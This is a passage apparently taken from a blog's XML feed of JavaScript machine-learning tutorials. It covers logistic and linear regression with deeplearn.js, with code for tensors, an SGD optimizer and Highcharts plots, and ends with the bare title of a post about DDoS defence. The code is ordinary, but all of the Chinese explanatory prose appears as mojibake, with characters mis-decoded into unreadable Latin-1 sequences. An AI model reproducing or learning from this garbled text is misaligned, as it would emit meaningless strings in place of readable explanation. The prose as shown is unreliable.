optimizer å¯é¡å¤–è¼¸å…¥å…©å€‹åƒæ•¸ï¼Œåˆ†åˆ¥æ§åˆ¶ 1. æ˜¯å¦å›å‚³æœ€å¾Œçš„ cost; 2. é™åˆ¶åªæ›´æ–°å“ªäº›è®Šæ•¸ã€‚æˆ‘å€‘ for loop 1000 æ¬¡å¾Œï¼Œåˆ©ç”¨ dataSync() ä¾†å°‡ä¿‚æ•¸å¾ Tensor è®€å‡ºï¼š
// ç”¨ dataSync å–å¾— training çµæœconst wPredict = W.dataSync();const bPredict = B.dataSync();console.log(wPredict, bPredict);

dataSync() æ˜¯ Synchronously çš„ï¼Œæœƒ block Browser çš„ UI threadï¼Œç›´åˆ° data è¢«ä½ è®€å‡ºã€‚å¦å¤–é‚„æœ‰å€‹ Asynchronously çš„ data() methodï¼Œæœƒå›å‚³ promiseï¼Œç•¶è®€å–çµæŸæ™‚å†å‘¼å« resolvesã€‚
å› ç‚ºæ¥ä¸‹ä¾†è¦ç”¨ Highcharts ç•«åœ–ï¼Œæ‰€ä»¥éœ€è¦æ¡ç”¨ dataSync() ä¾† block è‘— UI thread ç­‰è³‡æ–™è®€å‡ºå¾Œå†ç¹¼çºŒã€‚
å–å‡ºä¿‚æ•¸çš„å€¼å¾Œï¼Œå°±èƒ½ç®—å‡ºä¸€æ¢ Decision Boundary ä¸¦ç¹ªè£½å‡ºä¾†ï¼
æ ¹æ“šç®—å‡ºçš„ä¿‚æ•¸ï¼Œç•«å‡ºç·šæ¢é ­å°¾å…©é»ï¼š
// è¨ˆç®—åˆ‡å‰²ç·šæ®µconst data_line = [    [60, parseFloat((180 * wPredict[0] + bPredict[0])/wPredict[1])],    [180, parseFloat((60 * wPredict[0] + bPredict[0])/wPredict[1])]];console.log(data_line);

ç„¶å¾Œç”¨ HighCharts ç¹ªåœ–ï¼š
// ç¹ªè£½åœ–å½¢const data_scatter1 = [];const data_scatter2 = [];for (let elem of data) &#123;    if (elem.x &gt; 100 &amp;&amp; elem.y &gt; 100) &#123;        data_scatter1.push([elem.x, elem.y]);    &#125; else &#123;        data_scatter2.push([elem.x, elem.y]);    &#125;  &#125;        // Resultconst options = &#123;    title: &#123;        text: &#x27;deeplearn.js ä½ æ˜¯è°æ˜äººå—ï¼Ÿ&#x27;                     &#125;,    xAxis: &#123;        title: &#123;          text: &#x27;æ™ºå•†&#x27;                         &#125;,        min: 60,        max: 180    &#125;,    yAxis: &#123;        title: &#123;          text: &#x27;æ›¸è®€å¾—å¤šå¯¡&#x27;                         &#125;,        min: 60,        max: 180    &#125;,    series: [        &#123;            type: &#x27;line&#x27;,            name: &#x27;Decision Boundary&#x27;,             color: &#x27;#fff600&#x27;,            data: data_line        &#125;,          &#123;            type: &#x27;scatter&#x27;,            name: &#x27;Smart&#x27;,             marker: &#123;                symbol: &#x27;cross&#x27;,                  radius: 4                     &#125;,            color: &#x27;#FF0000&#x27;,            data: data_scatter1        &#125;,        &#123;            type: &#x27;scatter&#x27;,            name: &#x27;Stupid&#x27;,            marker: &#123;                symbol: &#x27;cross&#x27;,                  radius: 4                     &#125;,            color: &#x27;#6B8E23&#x27;,            data: data_scatter2        &#125;    ]&#125;;// å›¾è¡¨åˆå§‹åŒ–å‡½æ•°const chart = Highcharts.chart(&#x27;app&#x27;, options);

æœ€çµ‚æˆæœSee the Pen DeeplearnJS-logistic-regression by Arvin (@arvin0731) on CodePen.


çµè«–å†æ¬¡ä½¿ç”¨ deeplearn.js ä¾†å¯¦ä½œ Machine Learing æ¼”ç®—æ³•ï¼Œç™¼ç¾çœŸçš„è¦å¥—ç”¨é€™äº› library å·²ç¶“éå¸¸å®¹æ˜“äº†ï¼Œä½†é‚„æ˜¯å—é™æ–¼å°æ¼”ç®—æ³•èˆ‡æ•¸å­¸å…¬å¼çš„ç†è§£èˆ‡æ•éŠ³åº¦ï¼Œä¸éä¹Ÿæ˜¯é€éé€™æ¨£çš„å¯¦ä½œç·´ç¿’ï¼Œé€¼è¿«è‡ªå·±å»å˜—è©¦äº†è§£é€™äº›æ¼”ç®—æ³•èƒŒå¾Œçš„æ¦‚å¿µèˆ‡æ•¸å­¸ï¼Œåœ¨éç¨‹ä¸­ä¹Ÿä¸æ–·æƒ³èµ·ä»¥å‰å¤§å­¸ä¿®é›¢æ•£æ•¸å­¸çš„è¨˜æ†¶ï¼Œç•¶æ™‚éƒ½ä¸å¤ªæ‡‚è¦æ€éº¼ä½¿ç”¨é€™äº›æ•¸å­¸ï¼Œç¾åœ¨çŸ¥é“å¾Œå°±èƒ½è®€å¾—æ´¥æ´¥æœ‰å‘³ï¼Œä¹Ÿæ˜¯è »æœ‰æ„æ€çš„ï¼

è³‡æ–™ä¾†æº
ã€webAIã€‘deeplearn.jsçš„é‚è¼¯å›æ­¸
GitHub Deeplearnjs
Deeplearn js API doc
ç”¨äººè©±è§£é‡‹æ©Ÿå™¨å­¸ç¿’ä¸­çš„ Logistic Regression
Machine Learning å­¸ç¿’æ—¥è¨˜
ä½ å¯èƒ½ä¸çŸ¥é“çš„é‚è¼¯è¿´æ­¸
æ©Ÿå™¨å­¸ç¿’-æ”¯æ’å‘é‡æ©Ÿ(support vector machine, SVM)è©³ç´°æ¨å°

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>javascript</tag>
        <tag>deeplearnjs</tag>
        <tag>machine learning</tag>
        <tag>logistic-regression</tag>
      </tags>
  </entry>
  <entry>
    <title>ç”¨ Javascript é€²è¡Œç°¡å–®ç·šæ€§è¿´æ­¸åˆ†æ</title>
    <url>/2018/03/10/deeplearnjs-simple-linear-regression/</url>
    <content><![CDATA[å‰è¨€ç´„è«å…©å€‹æœˆå‰ï¼Œæˆ‘åˆ©ç”¨ p5-deeplearn-js é€™å¥—å·¥å…·åœ¨ Chrome extension ä¸­ç©äº†ä¸€ä¸‹æ©Ÿå™¨å­¸ç¿’çš„æ‡‰ç”¨ (è«‹åƒé–±å‰ç«¯ä¹Ÿèƒ½ç© Deepleaning - ä»¥ p5-deeplearn-js ç‚ºä¾‹)ï¼Œç•¶æ™‚é›–ç„¶æœ‰å»çœ‹ä»–å€‘çš„ source codeï¼Œä½†å°æ–¼åº•å±¤ deeplearnjs çš„éƒ¨åˆ†ä¸¦æ²’æœ‰ä»”ç´°å»äº†è§£ï¼Œç•¢ç«Ÿé‚„æ˜¯è¦å° ML æœ‰æ ¹æœ¬çš„äº†è§£ï¼Œæ‰èƒ½è®€å¾—æ‡‚ã€‚
è€Œéš¨è‘— Google ç™¼å¸ƒ Machine Learning Crash Courseï¼Œå†åº¦è®“æˆ‘æœ‰äº†ç ”ç©¶ deeplearn.js çš„å¿µé ­ï¼Œä½†è¬äº‹èµ·é ­é›£ï¼Œä¸€é–‹å§‹ä¸èƒ½å¤ªå‹‰å¼·è‡ªå·±ï¼Œæ‰€ä»¥æœ¬æ–‡å°±å…ˆå¾æœ€ç°¡å–®çš„ linear regression å¯¦ä½œé–‹å§‹ï¼Œä¾†ç†Ÿæ‚‰ä¸€ä¸‹åŸºæœ¬æ“ä½œï¼
ç…§æ…£ä¾‹å…ˆä¾†å¼µ Demo æˆæœåœ–ï¼š
 
ç¯„ä¾‹æ˜¯å¾ é€™ç¯‡æ–‡ç«  ä¸­ç²å¾—çš„éˆæ„Ÿï¼Œå‡è³‡æ–™ä¹Ÿæ˜¯å–è‡ªè©²è™•ã€‚
å…ˆé€²å…¥å‡æƒ³æƒ…å¢ƒï¼æƒ³åƒä¸€ä¸‹ä½ æ˜¯ä¸€é–“é£²æ–™åº—è€é—†ï¼Œåœ¨ç¶“æ¿Ÿä¸æ™¯æ°£çš„æƒ…æ³ä¸‹ï¼Œä½ éœ€è¦åš´æ ¼æ§ç®¡ä½ çš„é€²è²¨æˆæœ¬ï¼Œå› æ­¤ï¼Œè°æ˜çš„ä½ é–‹å§‹è§€å¯Ÿå„ç¨®å¯èƒ½ï¼Œæœ€å¾Œç™¼ç¾å¤©æ°£çš„è®ŠåŒ–èˆ‡ä½ çš„é£²æ–™éŠ·å”®é‡æœ‰å¾ˆå¤§çš„é—œè¯ï¼
ç„¶è€Œï¼Œæ°£è±¡è³‡æ–™å¾ˆå¥½å–å¾—ï¼Œä½†ä½ éœ€è¦çš„æ˜¯èƒ½å¤ é æ¸¬åœ¨å“ªç¨®å¤©æ°£ä¸‹ï¼Œä½ éœ€è¦é€²å¤šå°‘è²¨ï¼Œä»¥æ­¤ä¾†æ§ç®¡æ¯ä¸€æ¬¡çš„é€²è²¨é‡ã€‚
ä¹Ÿå°±æ˜¯èªªï¼Œä½ éœ€è¦ä¸€å€‹å…¬å¼ï¼
é€™å€‹å…¬å¼è¦èƒ½å¤ è®“ä½ è¼¸å…¥ä¸€å€‹ç‰¹å¾µ Xï¼ˆä¹Ÿå°±æ˜¯æ°£æº«åº¦æ•¸ï¼‰ï¼Œæ¥è‘—é€éé‹ç®—å¾Œç”¢ç”Ÿä¸€å€‹ç›®æ¨™è®Šæ•¸ Yï¼ˆä¹Ÿå°±æ˜¯é£²æ–™éŠ·å”®é‡ï¼‰ã€‚
èƒ½ç•¶åˆ°è€é—†ï¼Œæƒ³å¿…æ•¸å­¸ä¸æœƒå¤ªå·®ï¼Œæ•´ç†ä¸€ä¸‹å¾Œç™¼ç¾ï¼Œæˆ‘å€‘åªæœ‰ä¸€å€‹è‡ªè®Šé‡ Xï¼Œä»¥åŠå› è®Šé‡ Yï¼Œå› æ­¤å¯ä»¥å˜—è©¦ç”¨ä¸€å€‹ç°¡å–®çš„ç·šæ€§å‡½æ•¸ä¾†é€¼è¿‘é€™å…¬å¼ï¼š
Y = aX + b
å•é¡Œå°±ä¾†äº†ï¼Œè¦æ€éº¼æ¨£æ‰¾å‡ºé©åˆçš„ä¿‚æ•¸ a èˆ‡ b å‘¢ï¼Ÿ
å…ˆåˆ¥æ€¥ï¼Œè®“æˆ‘å€‘å…ˆæŠŠè³‡æ–™æ•´ç†ä¸€ä¸‹è³‡æ–™åˆ†æçš„ç¬¬ä¸€æ­¥ä¸€å®šæ˜¯å…ˆå–å¾—è³‡æ–™ï¼Œèº«ç‚ºé£²æ–™åº—è€é—†ï¼Œè¦å–å¾—éŠ·å”®è³‡é‡æ‡‰è©²ä¸é›£ï¼Œå†ä¸Šç¶²æŸ¥å€‹æ°£è±¡è³‡è¨Šå°±å¥½ï¼Œå› æ­¤å¯ä»¥å¾—åˆ°å¦‚ä¸‹è³‡æ–™ï¼š
// å»ºæ§‹è³‡æ–™ ï¼ˆç•¶ç„¶æ˜¯å‡çš„ï¼‰const degrees = [29, 28, 34, 31, 25, 29, 32, 31, 24, 33, 25, 31, 26, 30];const salesVolume = [77, 62, 93, 84, 59, 64, 80, 75, 58, 91, 51, 73, 65, 84];

è³‡æ–™æ˜¯æˆå°é—œä¿‚ï¼Œæ°£æº« 29 åº¦ï¼Œå†°ç´…èŒ¶éŠ·å”®é‡ 77ã€‚
æ¥è‘—æˆ‘å€‘å¯ä»¥å…ˆåˆ©ç”¨ HighCharts æŠŠè³‡æ–™å…ˆè¦–è¦ºåŒ–å‡ºä¾†ï¼Œä½ å°±æœƒå¾ˆæœ‰æ„Ÿè¦ºæˆ‘å€‘è©²åšä»€éº¼ã€‚
See the Pen DeeplearnJS-simple-linear-dataset by Arvin (@arvin0731) on CodePen.


å—¯â€¦çœ‹èµ·ä¾†é€™äº›é»ä¼¼ä¹çœŸçš„å¯ä»¥ç”¨ä¸€å€‹ç·šæ€§å‡½æ•¸å»é€¼è¿‘å‘¢ï¼è€Œä¸”æ›´æ£’çš„æ˜¯ï¼Œé€éé€™äº›éå¾€è³‡æ–™ï¼Œæ‡‰è©²æ˜¯æœ‰åŠ©æ–¼æˆ‘å€‘æ‰¾å‡ºå…¬å¼ä¸­æœ€æ£’çš„ä¿‚æ•¸çš„ï¼
æ¥è‘—å°±è©² Linear regression å°±ç™»å ´äº†ï¼åœ¨æ©Ÿå™¨å­¸ç¿’çš„é ˜åŸŸä¸­ï¼Œåƒæˆ‘å€‘é€™æ¨£ä¾é å¤§é‡è³‡æ–™ä¾†è¼”åŠ©å­¸ç¿’çš„ï¼Œç¨±ä½œç›£ç£å¼å­¸ç¿’ã€‚
è€Œç•¶å…¬å¼ä¸­çš„ç›®æ¨™è®Šæ•¸ï¼ˆä¹Ÿå°±æ˜¯ yï¼‰æ˜¯é€£çºŒå‹ï¼ˆcontinuousï¼‰çš„è®Šæ•¸æ™‚ï¼Œé€™æ¨£çš„å­¸ç¿’å•é¡Œæœƒç¨±ç‚ºå›æ­¸ï¼ˆregressionï¼‰å•é¡Œã€‚
é‚£ä¸€å€‹ç·šæ€§å‡½æ•¸çš„å›æ­¸å•é¡Œï¼Œå°±æ˜¯ç·šæ€§è¿´æ­¸ (linear regression) äº†ã€‚
é—œæ–¼ Linear regression çš„ä¸€äº›æ•¸å­¸å…¬å¼æ¨å°ç­‰ç­‰ï¼Œæˆ‘æ¨è–¦å¤§å®¶é–±è®€é€™ç¯‡æ–‡ç« ï¼šå²ä¸¹ä½›å¤§å­¸æ©Ÿå™¨å­¸ç¿’ï¼ˆMachine Learningï¼‰ä¸Šèª²ç­†è¨˜ï¼ˆä¸€ï¼‰
è£¡é¢è§£é‡‹å¾—æ·ºé¡¯æ˜“æ‡‚ï¼Œçµ•å°æ¯”æˆ‘è§£é‡‹å¾—é‚„å¥½â€¦
å°±ç®—ä¸æ¸…æ¥šç·šæ€§è¿´æ­¸ï¼Œå…‰çœ‹å…¬å¼æ‡‰è©²ä¹ŸçŸ¥é“ï¼Œæˆ‘å€‘å¯ä»¥é€éå¤§é‡çš„è¿­ä»£æ¸¬è©¦ï¼Œä¸æ–·è¼¸å…¥ Xï¼Œç„¶å¾Œèª¿æ•´ a èˆ‡ b ä¾†æ±‚å‡º Yï¼Œç„¶å¾Œæ‰¾å‡ºåœ¨æ‰€æœ‰ input ä¸­ï¼Œèƒ½å¾—åˆ°èˆ‡æ‰€æœ‰çœŸå¯¦è³‡æ–™å·®è·æœ€å°çš„ä¸€å°ä¿‚æ•¸å³å¯ã€‚
ç”¨ç·šæ€§å›æ­¸çš„æ¦‚å¿µä¾†è§£é‡‹ï¼Œå°±æ˜¯æˆ‘å€‘éœ€è¦æœ‰ä¸€å€‹ cost functionï¼ˆæˆ–ç¨± loss functionï¼‰ï¼Œè—‰ç”±ä¸åŒä¿‚æ•¸çš„è¼¸å…¥ï¼Œå¾å…¬å¼å¾—å‡ºçš„å€¼ä¾†èˆ‡å¯¦éš›è³‡æ–™æ¯”è¼ƒï¼Œæƒ³è¾¦æ³•æ‰¾å‡ºçµæœå·®è·æœ€å°çš„ä¿‚æ•¸ã€‚
ä¸€èˆ¬ä¾†èªªï¼Œcost function æœƒç”¨ LMSï¼ˆleast mean squaresï¼‰æ¼”ç®—æ³•ä¾†è™•ç†ï¼Œå¯ä»¥å…ˆçŒœä¸€å€‹åˆå§‹ä¿‚æ•¸å€¼ï¼Œç„¶å¾Œè—‰ç”± LMS ä¾†ä¸æ–·æ›´æ–°ä¿‚æ•¸ï¼Œç›´åˆ°æ‰¾å‡ºæœ€å°å·®è·çš„æƒ…æ³ã€‚
ä½†é€™æ˜¯å–®ä¸€ training sample çš„ç‹€æ³ï¼Œç•¶æœ‰å¤šå€‹ training sample æ™‚ï¼Œé€šç”¨çš„æ¼”ç®—æ³•ç¨±ç‚º stochastic gradient descent (sgd)ï¼Œæ¦‚å¿µé›·åŒï¼Œå°±åƒæ˜¯æ ¹æ“šæ¯ä¸€ç­† training sample å»è·‘ä¸€æ¬¡ LMSã€‚
ä¸€æ¨£ï¼Œé‚„æ˜¯è«‹å¤§å®¶å»é–±è®€ å²ä¸¹ä½›å¤§å­¸æ©Ÿå™¨å­¸ç¿’ï¼ˆMachine Learningï¼‰ä¸Šèª²ç­†è¨˜ï¼ˆä¸€ï¼‰ï¼Œç²å¾—æ›´æ­£ç¢ºçš„æ¦‚å¿µã€‚ç•¢ç«Ÿé€™æ¬¡ä¸»è¦æ˜¯ç·´ç¿’å¦‚ä½•ç”¨ deeplearnjs ä¾†å¯¦ä½œã€‚
è§£æ³•éƒ½æœ‰äº†ï¼Œé‚£å°±ä¾†çœ‹çœ‹åˆ°åº•æ€éº¼ç”¨ Javascript å¯¦ä½œå§ï¼è¦ä½¿ç”¨ deeplearn.jsï¼Œåªéœ€è¦å¾ cdn è¼‰å…¥å³å¯ï¼š
&lt;script src=&quot;https://unpkg.com/deeplearn@latest&quot;&gt;&lt;/script&gt;

æ¥è‘—ï¼Œæˆ‘å€‘è¦å…ˆåˆå§‹åŒ–è³‡æ–™ï¼š
// å»ºæ§‹è³‡æ–™const degrees = [29, 28, 34, 31, 25, 29, 32, 31, 24, 33, 25, 31, 26, 30];const salesVolume = [77, 62, 93, 84, 59, 64, 80, 75, 58, 91, 51, 73, 65, 84];// é‹ç”¨ Deeplearn.js çµæ§‹åŒ–è³‡æ–™// dl å°±æ˜¯ deeplearn.js çš„ global è®Šæ•¸const degrees_data = dl.tensor1d(degrees);const salesVolume_data = dl.tensor1d(salesVolume);

åœ¨ deeplearn.js ä¸­ï¼Œtensor æ˜¯æœ€æ ¸å¿ƒçš„è³‡æ–™çµæ§‹ï¼Œç”¨ä¾†è¡¨ç¤ºå‘é‡ã€çŸ©é™£æˆ–æ˜¯å¤šç¶­åº¦çš„è³‡æ–™ã€‚
æœ‰è¨±å¤š utility function å¯ä»¥è¼”åŠ©å‰µå»º tensor è³‡æ–™çµæ§‹ï¼Œåƒæ˜¯é€™é‚Šç”¨çš„æ˜¯ tensor1dï¼Œä¹Ÿå°±æ˜¯ 1D (1-dimension) çš„ tensorã€‚
ä¸€å€‹ tensor å…¶å¯¦åŒ…å«ä¸‰å€‹æˆåˆ†ï¼Œä¹Ÿæ˜¯å‰µå»º tensor æ™‚å¯ä»¥å‚³å…¥çš„åƒæ•¸ï¼š

values (TypedArray|Array): tensor çš„å€¼ã€‚å¯ä»¥æ˜¯ nested array æˆ– flat array çš„çµæ§‹ã€‚

shapeï¼ˆnumber[]ï¼‰:åŸºæœ¬ä¸Šå°±æ˜¯è©² tensor çš„ç¶­åº¦ã€‚è‹¥å‰µå»º tensor æ™‚æ²’æœ‰æŒ‡å®šç¶­åº¦ï¼Œå°±æœƒç¹¼æ‰¿å‚³å…¥çš„ values ç¶­åº¦ã€‚ä¹Ÿå¯ä»¥åƒé€™é‚Šçš„ç¯„ä¾‹ä¸€æ¨£ç›´æ¥ä½¿ç”¨ tensor$&#123;1|2|3|4&#125;d ä¾†å‰µå»º

dtypeï¼ˆfloat32â€™|â€™int32â€™|â€™boolï¼‰ï¼šå€¼çš„å‹åˆ¥ï¼Œç•¶ç„¶æ˜¯ optionalã€‚


åˆå§‹åŒ–å¥½ deeplearn.js çš„è³‡æ–™çµæ§‹å¾Œï¼Œæ¥è‘—å®šç¾©æˆ‘å€‘è¦ training çš„ä¿‚æ•¸ï¼Œé€™é‚Šå–ç‚º aw èˆ‡ baï¼š
// è¦ train çš„åƒæ•¸ aw, baconst aw = dl.variable(dl.scalar(Math.random()));const ba = dl.variable(dl.scalar(Math.random()));

dl.variable(initialValue, trainable?, name?, dtype?) ç”¨ä¾†å‰µå»º training éç¨‹ä¸­éœ€è¦çš„è®Šæ•¸ï¼Œä¹Ÿå¯é€éåƒæ•¸æŒ‡å®šè©²è®Šæ•¸èƒ½å¦åœ¨ training éç¨‹ä¸­è¢«ä¿®æ”¹ï¼ˆtrainableï¼‰ï¼Œé è¨­æ˜¯ trueã€‚
å…¶ä¸­ initialValue å¯ä»¥æ˜¯ä¸€å€‹ Tensorï¼Œä¹Ÿå¯ä»¥åƒæˆ‘å€‘é€™é‚Šä¸€æ¨£ï¼Œå‚³å…¥ dl.scalarã€‚
dl.scalar æ˜¯ç¶­åº¦ç‚º 0 çš„ tensorï¼ŒåŸºæœ¬ä¸Š 0 ç¶­å°±æ˜¯ä¸€å€‹é»ï¼Œç”±æ–¼æˆ‘å€‘åªéœ€è¦äº‚æ•¸ç”¢ç”Ÿä¸€å€‹åˆå€¼çµ¦ aw èˆ‡ baï¼Œå› æ­¤ç”¨ dl.scalar å³å¯ã€‚
å†ä¾†ï¼Œæˆ‘å€‘å®šç¾©ç›®æ¨™å‡½æ•¸èˆ‡ loss function
// å®šç¾©ç›®æ¨™å‡½æ•¸ èˆ‡ loss function ï¼ˆæœ€ä¸€èˆ¬çš„ mean squareï¼‰// f = aw * X + baconst f = x =&gt; aw.mul(x).add(ba);const loss = (pred, label) =&gt; pred.sub(label).square().mean();

åœ¨ deeplearn.js ä¸­ï¼Œå‡½æ•¸çš„å»ºæ§‹è »ç›´è¦ºçš„ï¼Œy = a * x + b å¯ä»¥ç›´æ¥å¯«æˆ  y = x =&gt; a.mul(x).add(b)
loss function å‰‡æ˜¯æ¥æ”¶å…©å€‹åƒæ•¸çš„å‡½å¼ï¼Œpred å°±æ˜¯ training data ä¸­çš„è‡ªè®Šå›  x é€éç›®æ¨™å‡½æ•¸ fï¼Œè¨ˆç®—å‡ºçš„å€¼ï¼Œè€Œ label æ˜¯ training data ä¸­çš„ç­”æ¡ˆ yã€‚
ç„¶å¾Œï¼Œå®šç¾©æˆ‘å€‘çš„ Optimizerï¼Œä¹Ÿå°±æ˜¯ç”¨ä¾†æœ€ä½³åŒ– loss function çµæœçš„æ¼”ç®—æ³•ï¼Œé€™é‚Šæ¡ç”¨ stochastic gradient descent (sgd)ï¼š
// æ¡ç”¨ stochastic gradient descent ä¾†åšæœ€ä½³åŒ– // learning rate é€™é‚Šä¸èƒ½è¨­å¤ªå¤§const learningRate = 0.0005;const optimizer = dl.train.sgd(learningRate);

dl.train.sgd æ˜¯ deeplearn.js å…§å»ºçš„ sgd æ¼”ç®—æ³•æ¨¡å‹ï¼Œæ¥å—ä¸€å€‹ leanring rate åƒæ•¸ã€‚åœ¨æ¯ä¸€æ¬¡çš„è¿­ä»£ä¸­ï¼Œä¿‚æ•¸éƒ½æœƒä¸æ–·è¢«æ›´æ–°ï¼Œä»¥æ‰¾å‡ºæœ€ä½³çš„çµæœï¼Œè€Œé€™å€‹ learningRate åƒæ•¸æ˜¯ç”¨ä¾†æ§åˆ¶æ¯ä¸€æ¬¡çš„æ›´æ–°å¹…åº¦ã€‚å› æ­¤ä¸èƒ½å¤ è¨­å¾—å¤ªå¤§ï¼Œä¹Ÿä¸èƒ½è¨­å¾—å¤ªå°ã€‚
åˆ©ç”¨å®šç¾©å¥½çš„ç›®æ¨™å‡½æ•¸ fã€loss function èˆ‡ optimizerï¼Œæˆ‘å€‘å¯ä»¥å°±é–‹å§‹ training modal äº†ï¼
// trainingfor (let i = 0; i &lt; 30; i++) &#123;  const cost = optimizer.minimize(() =&gt; loss(f(degrees_data), salesVolume_data), true, [aw, ba])  console.log(&#x27;cost&#x27;);  cost.print();  console.log(&#x27;aw&#x27;);  aw.print();  console.log(&#x27;ba&#x27;);  ba.print();&#125;

æœ€æ ¸å¿ƒçš„å°±æ˜¯é€™ä¸€è¡Œï¼š
const cost = optimizer.minimize(() =&gt; loss(f(degrees_data), salesVolume_data), true, [aw, ba])
ä½¿ç”¨ optimizer çš„æ–¹å¼å¦‚ä¸Šæ‰€ç¤ºï¼Œè¼¸å…¥åŸ·è¡Œ loss function çš„å‡½ç¤ºï¼Œä¸¦å¯é¡å¤–è¼¸å…¥å…©å€‹åƒæ•¸ï¼Œåˆ†åˆ¥æ§åˆ¶ 1. æ˜¯å¦å›å‚³æœ€å¾Œçš„ cost; 2. é™åˆ¶åªæ›´æ–°å“ªäº›è®Šæ•¸ã€‚
æˆ‘å€‘ç°¡å–® for loop 30 æ¬¡ï¼ˆå› ç‚ºè³‡æ–™é‡å¾ˆå°‘â€¦ä½ è¦ train ä¸€ç™¾æ¬¡ä¹Ÿè¡Œï¼Œä½†é€™é‚Šçµæœä¸æœƒæœ‰ä»€éº¼å·®åˆ¥ï¼‰
éç¨‹ä¸­è‹¥æƒ³è¦ debugï¼Œå¯ä»¥åƒæˆ‘ä¸€æ¨£ç”¨ tensor.print() çš„æ–¹å¼æŠŠ traning éç¨‹çš„ä¿‚æ•¸è®ŠåŒ– log å‡ºä¾†ã€‚
æœ€å¾Œï¼Œç•¶ training çµæŸå¾Œï¼Œé€é dataSync() å°‡æœ€çµ‚ä¿‚æ•¸å¾ Tensor ä¸­è®€å‡ºï¼š
// åˆ©ç”¨ dataSync() å–å‡º training å¾Œå¾—åˆ°çš„ä¿‚æ•¸const awPredict = aw.dataSync();const baPredict = ba.dataSync();

å¾ˆå®¹æ˜“çœ‹å‡º dataSync() æ˜¯ Synchronously çš„ï¼Œæœƒ block Browser çš„ UI threadï¼Œç›´åˆ° data è¢«ä½ è®€å‡ºã€‚å¦å¤–é‚„æœ‰å€‹ Asynchronously çš„ data() methodï¼Œæœƒå›å‚³ promiseï¼Œç•¶è®€å–çµæŸæ™‚å†å‘¼å« resolvesã€‚
åœ¨æˆ‘å€‘çš„ç¯„ä¾‹ä¸­ï¼Œå› ç‚ºæ¥ä¸‹ä¾†è¦ç”¨ Highcharts ç•«åœ–ï¼Œæˆ‘å€‘éœ€è¦ block è‘— UI thread ç­‰è³‡æ–™è®€å‡ºå¾Œå†ç¹¼çºŒï¼Œå› æ­¤æ¡ç”¨ dataSync()ã€‚
å–å‡ºä¿‚æ•¸çš„å€¼å¾Œï¼Œå°±èƒ½å¤ ç•«åœ–å•¦ï½
æ ¹æ“šç®—å‡ºçš„ä¿‚æ•¸ï¼Œç•«å‡ºç·šæ¢é ­å°¾å…©é»ï¼š
const dataLine = [    [22, parseFloat(22 * awPredict + baPredict)],    [35, parseFloat(35 * awPredict + baPredict)]]

ç„¶å¾Œç”¨ HighCharts ç¹ªåœ–ï¼š
const options = &#123;    title: &#123;        text: &#x27;deeplearn.js  æœ€é«˜æº«èˆ‡ç´…èŒ¶éŠ·å”®é‡&#x27;                     &#125;,    xAxis: &#123;      title: &#123;        text: &#x27;æ°£æº«&#x27;                       &#125;,      min: 20,      max: 40    &#125;,    yAxis: &#123;      title: &#123;        text: &#x27;éŠ·å”®é‡&#x27;                       &#125;,      min: 40,      max: 100    &#125;,    series: [        &#123;            type: &#x27;line&#x27;,            name: &#x27;predict line&#x27;,            data: dataLine        &#125;,          &#123;            type: &#x27;scatter&#x27;,            name: &#x27;dataset&#x27;,            marker: &#123;                symbol: &#x27;cross&#x27;,                  radius: 4                     &#125;,            data: dataset        &#125;    ]&#125;// ç¹ªè£½åœ–è¡¨const chart = Highcharts.chart(&#x27;app&#x27;, options);

æœ€çµ‚æˆæœSee the Pen DeeplearnJS-simple-linear by Arvin (@arvin0731) on CodePen.


çµè«–åˆæ¬¡ä½¿ç”¨ deeplearn.js å…¶å¯¦ä¸»è¦é–€æª»é‚„æ˜¯åœ¨æ–¼å° Machine Learning çš„äº†è§£ä¸å¤ ï¼Œæˆ‘æœ‰ç¨å¾®æ¯”å°ä¸€ä¸‹ç”¨ python èˆ‡ R çš„åšæ³•ï¼Œå…¶å¯¦éƒ½å¾ˆé›·åŒï¼ŒåŒ…å«è³‡æ–™å‘é‡çš„æ¦‚å¿µéƒ½æ˜¯ï¼ŒåŠ ä¸Šå¾ˆå¤šæ¼”ç®—æ³•åœ¨é€™äº›èªè¨€çš„ library ä¸­éƒ½æœ‰å…§å»ºï¼Œç›¸ä¿¡å° ML èˆ‡ DL æœ‰æ·±å…¥äº†è§£çš„äººä¾†å­¸ç¿’ deeplearn.js æœƒæ›´å¾—å¿ƒæ‡‰æ‰‹ã€‚deeplearn.js ç•¢ç«Ÿæœ‰ Google æ”¯æŒï¼Œä¹Ÿæ”¯æ´ TensorFlow çš„ modalï¼Œé‚„æ˜¯å¾ˆå€¼å¾—æŠ•è³‡å­¸ç¿’çš„ï¼Œæƒ³æƒ³æœªä¾†èƒ½ç”¨åˆ¥äººçš„ browser ä¾† training ä½ çš„ modal æœ‰å¤šå¥½å•Šï¼å–”ä¸ï¼Œæ˜¯æƒ³æƒ³æœªä¾† Web èƒ½å› æ­¤æœ‰æ›´å¤šçš„ç™¼å±•æ½›åŠ›ï¼Œå¤šå¥½å‘€ï¼

è³‡æ–™ä¾†æº
GitHub Deeplearnjs
Deeplearn js API doc
æ©Ÿå™¨å­¸ç¿’ ç©å…·è³‡æ–™èˆ‡ç·šæ€§è¿´æ­¸
å²ä¸¹ä½›å¤§å­¸æ©Ÿå™¨å­¸ç¿’ï¼ˆMachine Learningï¼‰ä¸Šèª²ç­†è¨˜
deeplearn.jsçš„ç·šæ€§è¿´æ­¸
8 å¤§JavaScript æ©Ÿå™¨å­¸ç¿’æ¡†æ¶ä¹‹æ¢ç´¢

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>javascript</tag>
        <tag>deeplearnjs</tag>
        <tag>machine learning</tag>
        <tag>linear-regression</tag>
      </tags>
  </entry>
  <entry>
    <title>èˆ‡ DDoS å¥®æˆ°ï¼šnginx, iptables èˆ‡ fail2ban</title>
    <url>/2016/08/12/defend-against-ddos-with-nginx-iptable-and-fail2ban/</url>
